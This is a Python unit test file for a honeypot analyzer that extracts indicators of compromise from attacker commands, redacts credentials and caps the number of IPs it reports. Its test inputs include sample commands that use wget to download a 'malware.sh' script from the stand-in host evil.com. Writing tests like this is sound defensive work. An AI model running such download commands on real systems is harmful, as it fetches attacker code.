"""IOC coverage with privacy and cardinality limits."""

import unittest
from honeypot.intelligence.analyzer import Analyzer


class IocTests(unittest.TestCase):
    def test_urls_ips_domains_hashes_and_files(self):
        md5 = "a" * 32
        sha = "b" * 64
        command = f"wget -O /tmp/malware.sh 'http://user:secret@evil.com/a.sh?token=private' && ping 192.168.1.1 && cat {md5} {sha}"
        data = Analyzer().analyze(command).indicators
        self.assertEqual(data["urls"], ["http://evil.com/a.sh"])
        self.assertIn("evil.com", data["domains"])
        self.assertIn("192.168.1.1", data["ips"])
        self.assertIn("malware.sh", data["files"])
        self.assertEqual(data["md5"], [md5])
        self.assertEqual(data["sha256"], [sha])
        self.assertNotIn("secret", str(data))
        self.assertNotIn("token", str(data))

    def test_bad_ips_echo_and_disabled_iocs(self):
        result = Analyzer().analyze("echo 'http://evil.com/a.sh 999.1.2.3'")
        self.assertEqual(result.indicators["urls"], [])
        self.assertEqual(result.indicators["ips"], [])
        self.assertEqual(Analyzer(ioc_enabled=False).analyze("wget https://evil.com/a.sh").indicators["hosts"], [])
        many = Analyzer().analyze("ping " + " ".join(f"192.0.2.{i}" for i in range(1, 30)))
        self.assertLessEqual(len(many.indicators["ips"]), 8)


if __name__ == "__main__":
    unittest.main()
